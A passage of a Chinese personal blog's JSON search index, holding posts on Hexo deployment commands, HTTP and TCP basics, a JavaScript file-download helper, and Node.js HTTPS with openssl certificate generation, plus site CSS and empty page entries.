title=\"git，部署常用命令\"></a>git，部署常用命令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo -g #安装  </span><br><span class=\"line\">npm update hexo -g #升级  </span><br><span class=\"line\">hexo init #初始化</span><br><span class=\"line\">\t</span><br><span class=\"line\">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</span><br><span class=\"line\">hexo p == hexo publish</span><br><span class=\"line\">hexo g == hexo generate#生成</span><br><span class=\"line\">hexo s == hexo server #启动服务预览</span><br><span class=\"line\">hexo d == hexo deploy#部署</span><br></pre></td></tr></table></figure>\n<p>服务器</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。</span><br><span class=\"line\">hexo server -s #静态模式</span><br><span class=\"line\">hexo server -p <span class=\"number\">5000</span> #更改端口</span><br><span class=\"line\">hexo server -i <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.1</span> #自定义 IP</span><br><span class=\"line\">hexo clean #清除缓存 网页正常情况下可以忽略此条命令</span><br><span class=\"line\">hexo g #生成静态网页</span><br><span class=\"line\">hexo d #开始部署</span><br></pre></td></tr></table></figure>\n<h2 id=\"RSS订阅\"><a href=\"#RSS订阅\" class=\"headerlink\" title=\"RSS订阅\"></a>RSS订阅</h2><p>安装RSS插件</p>\n<p>npm install hexo-generator-feed –save<br>开启RSS功能</p>\n<p>编辑hexo/_config.yml，添加如下代码:</p>\n<p>rss: /atom.xml #rss地址  默认即可</p>\n<h2 id=\"使用locovpn无法上传博客\"><a href=\"#使用locovpn无法上传博客\" class=\"headerlink\" title=\"使用locovpn无法上传博客\"></a>使用locovpn无法上传博客</h2><p>上传博客时，关闭vpn</p>\n<h2 id=\"博客出问题时\"><a href=\"#博客出问题时\" class=\"headerlink\" title=\"博客出问题时\"></a>博客出问题时</h2><p>hexo clean </p>\n<p>hexo init /<em>初始化数据</em>/</p>\n<p>hexo g</p>\n<p>hexo d -g</p>\n<h2 id=\"搜索功能\"><a href=\"#搜索功能\" class=\"headerlink\" title=\"搜索功能\"></a>搜索功能</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo-search</span><br></pre></td></tr></table></figure>\n<h2 id=\"数字统计功能\"><a href=\"#数字统计功能\" class=\"headerlink\" title=\"数字统计功能\"></a>数字统计功能</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo-wordcount</span><br></pre></td></tr></table></figure>\n","categories":["other"],"tags":["hexo"]},{"title":"http常见问题","url":"http://zhoushaw.github.io/2017/03/05/learning/http/http-question/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"字节流传输\"><a href=\"#字节流传输\" class=\"headerlink\" title=\"字节流传输\"></a>字节流传输</h2><blockquote>\n<p>如何实现字节流接收并下载</p>\n</blockquote>\n<p>// 将其定义在util.js中，需要时倒入，输入字节流对象即可进行下载<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 下载blob的文件</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> downLoadFile = <span class=\"function\">(<span class=\"params\">fileData</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> blob     = <span class=\"keyword\">new</span> Blob([fileData],&#123;<span class=\"string\">'type'</span>:<span class=\"string\">'application/msexcel'</span>&#125;);  <span class=\"comment\">// [文件]&#123;类型&#125;</span></span><br><span class=\"line\">    <span class=\"comment\">// 创建a标签模拟点击事件并下载</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> a        = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'a'</span>);</span><br><span class=\"line\">    a.download = <span class=\"string\">'excel.xls'</span>  <span class=\"comment\">// 下载的文件名</span></span><br><span class=\"line\">    a.href     = <span class=\"built_in\">window</span>.URL.createObjectURL(blob);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> evt = <span class=\"built_in\">document</span>.createEvent(<span class=\"string\">\"MouseEvents\"</span>);</span><br><span class=\"line\">    evt.initEvent(<span class=\"string\">\"click\"</span>, <span class=\"literal\">false</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    a.dispatchEvent(evt);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>字节流传输</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> formData = <span class=\"keyword\">new</span> FormData()</span><br><span class=\"line\"><span class=\"comment\">// 设置文件内容</span></span><br><span class=\"line\">formData.append(<span class=\"string\">'file'</span>, item.file)</span><br><span class=\"line\"><span class=\"comment\">// 与后台约定的一些键值</span></span><br><span class=\"line\">formData.append(<span class=\"string\">'type'</span>, <span class=\"keyword\">this</span>.qrCodeType)</span><br></pre></td></tr></table></figure>\n<h2 id=\"http请求报文\"><a href=\"#http请求报文\" class=\"headerlink\" title=\"http请求报文\"></a>http请求报文</h2><blockquote>\n<p>content-type</p>\n</blockquote>\n<p>1.text/html<br>2.text/plain<br>3.text/css<br>4.text/javascript<br>5.application/x-www-form-urlencoded<br>6.multipart/form-data<br>7.application/json<br>8.application/xml</p>\n<blockquote>\n<p>application/x-www-form-urlencoded</p>\n</blockquote>\n<p>application/x-www-form-urlencoded是常用的表单发包方式，普通的表单提交，或者js发包</p>\n<blockquote>\n<p>application/json</p>\n</blockquote>\n<p>application/json,通过json格式发送数据</p>\n<h2 id=\"三次握手\"><a href=\"#三次握手\" class=\"headerlink\" title=\"三次握手\"></a>三次握手</h2><p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。 </p>\n<ul>\n<li>第一次握手:建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认； </li>\n<li>第二次握手:服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</li>\n<li>第三次握手:客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。 完成三次握手，客户端与服务器开始传送数据.</li>\n</ul>\n<h2 id=\"四次分手\"><a href=\"#四次分手\" class=\"headerlink\" title=\"四次分手\"></a>四次分手</h2><p>【注意】中断连接端可以是Client端，也可以是Server端。</p>\n<ol>\n<li><p>假设Client端发起中断连接请求，也就是发送FIN报文。</p>\n</li>\n<li><p>Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。</p>\n</li>\n<li><p>这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。</p>\n</li>\n<li><p>Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。 Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>\n</li>\n</ol>\n<h2 id=\"浏览器输入url发生了什么\"><a href=\"#浏览器输入url发生了什么\" class=\"headerlink\" title=\"浏览器输入url发生了什么\"></a>浏览器输入url发生了什么</h2><p>总体来说分为以下几个过程:</p>\n<p>DNS解析</p>\n<p>TCP连接</p>\n<p>发送HTTP请求</p>\n<p>服务器处理请求并返回HTTP报文</p>\n<p>浏览器解析渲染页面</p>\n<p>连接结束</p>\n<h2 id=\"http状态码\"><a href=\"#http状态码\" class=\"headerlink\" title=\"http状态码\"></a>http状态码</h2><p><a href=\"http://www.runoob.com/http/http-status-codes.html\" target=\"_blank\" rel=\"noopener\">状态码</a></p>\n<p>协议、域名、端口有任何一个不同，都被当作是不同的域</p>\n","categories":["work"],"tags":["http"]},{"title":"https","url":"http://zhoushaw.github.io/2017/02/01/learning/http/https/","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><blockquote>\n<p>在nodejs中，提供了 https 这个模块来完成 HTTPS 相关功能。从官方文档来看，跟 http 模块用法非常相似</p>\n</blockquote>\n<p>包含两部分内容:</p>\n<ol>\n<li>通过客户端、服务端的例子，对https模块进行入门讲解。</li>\n<li>如何访问安全证书不受信任的网站。（以 12306 为例子）</li>\n</ol>\n<div><a id=\"more\"></a></div>\n\n<h2 id=\"客户端例子\"><a href=\"#客户端例子\" class=\"headerlink\" title=\"客户端例子\"></a>客户端例子</h2><p><code>跟http模块的用法非常像，只不过请求的地址是https协议的而已，代码如下:</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var https = require(&apos;https&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">https.get(&apos;https://www.baidu.com&apos;, function(res)&#123;</span><br><span class=\"line\">    console.log(&apos;status code: &apos; + res.statusCode);</span><br><span class=\"line\">    console.log(&apos;headers: &apos; + res.headers);</span><br><span class=\"line\"></span><br><span class=\"line\">    res.on(&apos;data&apos;, function(data)&#123;</span><br><span class=\"line\">        process.stdout.write(data);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;).on(&apos;error&apos;, function(err)&#123;</span><br><span class=\"line\">    console.error(err);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"生成证书\"><a href=\"#生成证书\" class=\"headerlink\" title=\"生成证书\"></a>生成证书</h2><blockquote>\n<p>生成公私钥</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 生成服务器端私钥</span><br><span class=\"line\">openssl genrsa -out server.key 1024</span><br><span class=\"line\"># 生成服务器端公钥</span><br><span class=\"line\">openssl rsa -in server.key -pubout -out server.pem</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"># 生成客户端私钥</span><br><span class=\"line\">openssl genrsa -out client.key 1024</span><br><span class=\"line\"># 生成客户端公钥</span><br><span class=\"line\">openssl rsa -in client.key -pubout -out client.pem</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>生成 CA 证书</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 生成 CA 私钥</span><br><span class=\"line\">openssl genrsa -out ca.key 1024</span><br><span class=\"line\"># X.509 Certificate Signing Request (CSR) Management.</span><br><span class=\"line\">openssl req -new -key ca.key -out ca.csr</span><br><span class=\"line\"># X.509 Certificate Data Management.</span><br><span class=\"line\">openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>生成服务器端证书和客户端证书</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 服务器端需要向 CA 机构申请签名证书，在申请签名证书之前依然是创建自己的 CSR 文件</span><br><span class=\"line\">openssl req -new -key server.key -out server.csr</span><br><span class=\"line\"># 向自己的 CA 机构申请证书，签名过程需要 CA 的证书和私钥参与，最终颁发一个带有 CA 签名的证书</span><br><span class=\"line\">openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in server.csr -out server.crt</span><br><span class=\"line\"> </span><br><span class=\"line\"># client 端</span><br><span class=\"line\">openssl req -new -key client.key -out client.csr</span><br><span class=\"line\"># client 端到 CA 签名</span><br><span class=\"line\">openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in client.csr -out client.crt</span><br></pre></td></tr></table></figure>\n","categories":["http"],"tags":["http"]},{"title":"404 Not Found:该页无法显示","url":"http://zhoushaw.github.io//404.html","content":"<style type=\"text/css\">\n    .article-title {\n        font-size: 2.1em;\n    }\n    strong a {\n        color: #747474;\n    }\n    .player {\n        margin-left: -10px;\n    }\n    .sign {\n        text-align: right;\n        font-style: italic;\n    }\n    .share,\n    #page-visit,\n    .visit span:nth-child(2),\n    .pic br {\n        display: none;\n    }\n    .center {\n        text-align: center;\n        height: 2.5em;\n        font-weight: bold;\n    }\n    .search2 {\n        height: 2.2em;\n        font-size: 1em;\n        width: 50%;\n        margin: auto 24%;\n        color: #727272;\n        opacity: .6;\n        border: 2px solid lightgray;\n    }\n    .search2:hover {\n        opacity: 1;\n        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3)\n        };\n    .article-entry hr {\n        margin: 0;\n    }\n    .pic {\n        text-align: center;\n        margin: 0;\n    }\n</style>\n\n<hr>\n<div class=\"pic\"><br><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190317_329857b9fc0h265age1bkk542jlij_400x204.gif\" title=\"Mihawk-Wind\"><br></div>\n\n<p class=\"center\">很抱歉，您所访问的地址并不存在: </p>\n\n<p class=\"center\"><a href=\"/\">回主页</a> · <a href=\"/archives\">所有文章</a> · <a href=\"/about\">留言板</a></p>\n\n","categories":[],"tags":[]},{"title":"about","url":"http://zhoushaw.github.io/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://zhoushaw.github.io/categories/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://zhoushaw.github.io/project/index.html","content":"","categories":[],"tags":[]},{"title":"","url":"http://zhoushaw.github.io/css/personal-style.css","content":"@font-face {\n  font-family: \"Meiryo\";\n  src: url(\"/fonts/Meiryo.eot\");\n  /* IE9 */\n  src: url(\"/fonts/Meiryo.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n  url(\"/fonts/Meiryo.woff\") format(\"woff\"), /* chrome, firefox */\n  url(\"/fonts/Meiryo.ttf\") format(\"truetype\"), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */\n  url(\"/fonts/Meiryo.svg#Meiryo\") format(\"svg\");\n  /* iOS 4.1- */\n  font-style: normal;\n  font-weight: normal;\n}\n/* ����㲻ϲ����ҳ���İ�ɫ������Ի�һ�㣬������Զ�����ҳ�ı�����ɫ����ͼƬ */\nhtml.page-home {\n    position: absolute;\n    top: 0;\n    left: 0;\n    right: 0;\n    bottom: 0;\n    /* background-image: url('/images/bg.jpg'); */\n    background-color: transparent;\n    background-size: cover;\n    background-position: center center;\n    background-repeat: no-repeat;\n  \n    background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);\n    /*background-blend-mode: screen;*/\n  \n    /* background: linear-gradient(to left, #5f2c82, #49a09d); */\n}\n\n/* 头像去除默认圆角 */\n.content-home .avatar img,.page-header .box-blog-info img {\nborder-radius: 0;\n}\n\n\n/* 修改默认颜色 */\n\n.content-home .name,.content-home .nav,.content-home .nav .item a,.content-home .slogan {\n    color: #fff;\n}","categories":[],"tags":[]},{"title":"search","url":"http://zhoushaw.github.io/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://zhoushaw.github.io/tags/index.html","content":"","categories":[],"tags":[]}]